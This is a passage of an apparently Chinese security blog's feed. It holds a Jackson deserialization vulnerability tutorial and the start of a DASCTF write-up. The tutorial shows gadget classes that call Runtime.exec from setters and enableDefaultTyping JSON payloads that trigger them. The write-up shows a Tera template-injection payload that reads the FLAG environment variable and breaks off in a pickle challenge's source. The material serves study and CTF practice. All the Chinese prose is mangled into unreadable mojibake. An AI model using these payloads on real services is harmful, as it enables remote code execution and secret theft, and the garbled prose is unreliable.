class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>json<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">User2</span> u2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">User2</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>u2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225000040426.png" alt="image-20241225000040426"></p><p>å¯ä»¥çœ‹åˆ°åºåˆ—åŒ–ä¼šè°ƒç”¨ getterï¼Œè€Œååºåˆ—åŒ–ä¼šè°ƒç”¨æ„é€ æ–¹æ³•å’Œ setterï¼Œå’Œ fastjson ç±»ä¼¼</p><br><hr><h1 id="Jacksonååºåˆ—åŒ–æ¼æ´demo"><a href="#Jacksonååºåˆ—åŒ–æ¼æ´demo" class="headerlink" title="Jacksonååºåˆ—åŒ–æ¼æ´demo"></a>Jacksonååºåˆ—åŒ–æ¼æ´demo</h1><p>æ»¡è¶³ä¸‹é¢ä¸‰ä¸ªæ¡ä»¶ä¹‹ä¸€å³å­˜åœ¨ Jackson ååºåˆ—åŒ–æ¼æ´ï¼š</p><ul><li>è°ƒç”¨äº† <code>ObjectMapper.enableDefaultTyping()</code> å‡½æ•°ï¼›</li><li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸º <code>JsonTypeInfo.Id.CLASS</code> çš„ <code>@JsonTypeInfo</code> æ³¨è§£ï¼›</li><li>å¯¹è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§ä½¿ç”¨äº†å€¼ä¸º <code>JsonTypeInfo.Id.MINIMAL_CLASS</code> çš„ <code>@JsonTypeInfo</code> æ³¨è§£ï¼›</li></ul><p>ç”±ä¹‹å‰çš„ç»“è®ºçŸ¥é“ï¼Œå½“ä½¿ç”¨çš„ JacksonPolymorphicDeserialization æœºåˆ¶é…ç½®æœ‰é—®é¢˜æ—¶ï¼ŒJackson ååºåˆ—åŒ–å°±ä¼šè°ƒç”¨å±æ€§æ‰€å±ç±»çš„æ„é€ å‡½æ•°å’Œ setter æ–¹æ³•ã€‚</p><p>è€Œå¦‚æœè¯¥æ„é€ å‡½æ•°æˆ– setter æ–¹æ³•å­˜åœ¨å±é™©æ“ä½œï¼Œé‚£ä¹ˆå°±å­˜åœ¨ Jackson ååºåˆ—åŒ–æ¼æ´ã€‚</p><h2 id="å±æ€§ä¸ä¸ºObjectç±»æ—¶"><a href="#å±æ€§ä¸ä¸ºObjectç±»æ—¶" class="headerlink" title="å±æ€§ä¸ä¸ºObjectç±»æ—¶"></a>å±æ€§ä¸ä¸ºObjectç±»æ—¶</h2><p>å½“è¦è¿›è¡Œååºåˆ—åŒ–çš„ç±»çš„å±æ€§æ‰€å±ç±»çš„æ„é€ å‡½æ•°æˆ– setter æ–¹æ³•æœ¬èº«å­˜åœ¨æ¼æ´æ—¶ï¼Œè¿™ç§åœºæ™¯å­˜åœ¨ Jackson ååºåˆ—åŒ–æ¼æ´ï¼Œå®é™…åœºæ™¯å‡ ä¹ä¸å¯èƒ½å­˜åœ¨è¿™ç§å¥½äº‹</p><p>ç›´æ¥ä¿®æ”¹ MySex ç±»çš„ setSex ()æ–¹æ³•ï¼Œåœ¨å…¶ä¸­æ·»åŠ å‘½ä»¤æ‰§è¡Œæ“ä½œ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySex</span> <span class="token keyword">implements</span> <span class="token class-name">Sex</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sex<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">MySex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySexæ„é€ å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.getSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> sex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setSex</span><span class="token punctuation">(</span><span class="token keyword">int</span> sex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"MySex.setSex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person3ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person3</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Sex</span> sex<span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> sex <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> sex<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–å†™ååºåˆ—åŒ–ç±»ï¼Œæ„é€  Payload</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationRun</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> json <span class="token operator">=</span> <span class="token string">"&#123;\"age\":16,\"name\":\"0w0\",\"sex\":[\"MySex\",&#123;\"sex\":1&#125;]&#125;"</span><span class="token punctuation">;</span>          <span class="token class-name">Person3</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person3</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225003715010.png" alt="image-20241225003715010"></p><hr><h2 id="å±æ€§ä¸ºObjectç±»æ—¶"><a href="#å±æ€§ä¸ºObjectç±»æ—¶" class="headerlink" title="å±æ€§ä¸ºObjectç±»æ—¶"></a>å±æ€§ä¸ºObjectç±»æ—¶</h2><p>å½“å±æ€§ç±»å‹ä¸º Object æ—¶ï¼Œå› ä¸º Object ç±»å‹æ˜¯ä»»æ„ç±»å‹çš„çˆ¶ç±»ï¼Œå› æ­¤æ‰©å¤§äº†æˆ‘ä»¬çš„æ”»å‡»é¢ï¼Œæˆ‘ä»¬åªéœ€è¦å¯»æ‰¾å‡ºåœ¨ç›®æ ‡æœåŠ¡ç«¯ç¯å¢ƒä¸­å­˜åœ¨çš„ä¸”æ„é€ å‡½æ•°æˆ– setter æ–¹æ³•å­˜åœ¨æ¼æ´ä»£ç çš„ç±»å³å¯è¿›è¡Œæ”»å‡»åˆ©ç”¨ã€‚</p><p>Evilï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Evil</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> cmd<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCmd</span><span class="token punctuation">(</span><span class="token class-name">String</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>cmd <span class="token operator">=</span> cmd<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Person4ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">JsonTypeInfo</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person4</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token comment">// @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)</span>    <span class="token comment">// æˆ– @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span>    <span class="token keyword">public</span> <span class="token class-name">Object</span> object<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person4</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person4 æ„é€ å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Person4 setter å‡½æ•°"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"Person.age=%d, Person.name=%s, %s"</span><span class="token punctuation">,</span> age<span class="token punctuation">,</span> name<span class="token punctuation">,</span> object <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token string">"null"</span> <span class="token operator">:</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ååºåˆ—åŒ–ä»£ç ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>fasterxml<span class="token punctuation">.</span>jackson<span class="token punctuation">.</span>databind<span class="token punctuation">.</span></span><span class="token class-name">ObjectMapper</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DeserializationObjectRun</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ObjectMapper</span> mapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectMapper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        mapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> json <span class="token operator">=</span> <span class="token string">"&#123;\"age\":16,\"name\":\"0w0\",\"object\":[\"Evil\",&#123;\"cmd\":\"calc\"&#125;]&#125;"</span><span class="token punctuation">;</span>        <span class="token class-name">Person4</span> p2 <span class="token operator">=</span> mapper<span class="token punctuation">.</span><span class="token function">readValue</span><span class="token punctuation">(</span>json<span class="token punctuation">,</span> <span class="token class-name">Person4</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/24/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20241225004159668.png" alt="image-20241225004159668"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å­¦æœŸåˆçˆ½å­¦ä¸€æ¬¡Javaï¼Œå­¦æœŸæœ«å†çˆ½å­¦ä¸€æ¬¡JavağŸ˜‹&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&quot;&gt;https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/#0x01-Jackson-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/&quot;&gt;https://boogipop.com/2023/06/20/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%9A%E6%9D%80Web%E9%A2%98/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zer0peach.github.io/2023/09/27/Jackson/&quot;&gt;https://zer0peach.github.io/2023/09/27/Jackson/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="ååºåˆ—åŒ–" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF x 0psu3 2024æœ€åä¸€æˆ˜</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/</id>
    <published>2024-12-21T01:57:00.000Z</published>
    <updated>2025-01-14T17:39:57.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ—¶éš”ä¸€å¹´ï¼Œè¿™æ¬¡è¿ç­¾åˆ°éƒ½å·®ç‚¹åšä¸æ¥äº†</p><p>å”‰å”‰webåˆçˆ†é›¶äº†ï¼ŒåŸ‹äº†ï¼Œå¾—äº†ä¸€ç§æ‰“ DAS å°±åšä¸åŠ¨é¢˜çš„ç—…</p><p>ç­‰æœŸæœ«è€ƒå®Œå†å¤ç°ï¼Œè¦è¢«æœŸæœ«è€ƒè–„çº±äº†ğŸ˜­</p><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18620905">https://www.cnblogs.com/gxngxngxn/p/18620905</a></p><p><a href="https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#">https://www.yuque.com/chuangfeimeiyigeren/eeii37/oxv3gaim7fr89ed2?singleDoc#</a></p><p><a href="https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/">https://zer0peach.github.io/2024/12/30/DASCTF2024-%E5%AF%92%E5%A4%9C%E7%A0%B4%E6%99%93-%E5%86%AC%E8%87%B3%E7%BB%88%E7%AB%A0-web/</a></p><span id="more"></span><hr><h1 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h1><blockquote><p>è¯·ä»”ç»†è§‚å¯Ÿè¿™ä¸ªé“¾æ¥ï¼Œä¼šå…ˆåˆ° <a href="http://game.wetolink.com/">game.wetolink.com</a>ï¼Œé‚£ä¹ˆï¼Œç¨å¾®æ‰«æä¸€ä¸‹èƒ½æœ‰ä»€ä¹ˆå‘ç°å‘¢ï¼Ÿ</p></blockquote><p>å…¬ç½‘ https æˆ‘å“ªæ•¢ç›´æ¥æ‰«å•Šï¼ˆ</p><p>å®ƒç»™çš„ç½‘ç«™å¹¶éçœŸå®çš„æŠ¥åç½‘ç«™</p><p>æ‰«ä¸€ä¸‹å‘ç°æœ‰robots.txt</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221170034012.png" alt="image-20241221170034012"></p><hr><h1 id="è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨"><a href="#è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨" class="headerlink" title="è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨"></a>è¥¿æ¹–è®ºå‰‘é‚€è¯·å‡½è·å–å™¨</h1><blockquote><p>æäº¤æˆªå›¾é‚£é‡Œï¼Œé˜Ÿåå¥½åƒå¯ä»¥ 81 ï¼Ÿä½†å¥½åƒä¸æ˜¯ Python å†™çš„ï¼Œæ˜¯ Rust å—ï¼ˆå–œï¼‰ï¼›ä¸ç”¨RCEï¼Œæ‹¿åˆ°ç¯å¢ƒå˜é‡FLAGçš„å†…å®¹å³å¯ã€‚</p></blockquote><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221170314887.png" alt="image-20241221170314887"></p><p>æœ‰ssti</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221171013243.png" alt="image-20241221171013243"></p><p>æµ…æµ…æµ‹ä¸€ä¸‹å‘ç°ç¡®å®æ˜¯ tera æ¨¡æ¿ï¼Œæ­¤äº‹åœ¨<a href="https://c1oudfl0w0.github.io/blog/2024/10/21/2024%E4%B8%89%E5%B3%A1%E6%9D%AF/#textme">ä¸‰å³¡æ¯åˆèµ›</a>ä¸­äº¦æœ‰è®°è½½</p><p>æ— è¿‡æ»¤é‚£å°±ç›´æ¥è¯»</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token function">get_env</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"FLAG"</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20241221171243779.png" alt="image-20241221171243779"></p><hr><h1 id="const-pythonï¼ˆå¤ç°ï¼‰"><a href="#const-pythonï¼ˆå¤ç°ï¼‰" class="headerlink" title="const_pythonï¼ˆå¤ç°ï¼‰"></a>const_pythonï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> builtins<span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> uuid<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>jsonify<span class="token punctuation">,</span>session<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'SECRET_KEY'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> auth<span class="token operator">=</span><span class="token string">'ctfer'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>username <span class="token operator">=</span> username        self<span class="token punctuation">.</span>password <span class="token operator">=</span> password        self<span class="token punctuation">.</span>auth <span class="token operator">=</span> authpassword <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>Admin <span class="token operator">=</span> User<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> password<span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Welcome to my application"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">post_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token punctuation">:</span>            <span class="token keyword">if</span> password <span class="token operator">==</span> admin<span class="token punctuation">.</span>password<span class="token punctuation">:</span>                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"admin"</span>                <span class="token keyword">return</span> <span class="token string">"Welcome Admin"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Invalid Credentials"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''        &lt;form method="post">        &lt;!-- /src may help you>            Username: &lt;input type="text" name="username">&lt;br>            Password: &lt;input type="password" name="password">&lt;br>            &lt;input type="submit" value="Login">        &lt;/form>    '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ppicklee'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token 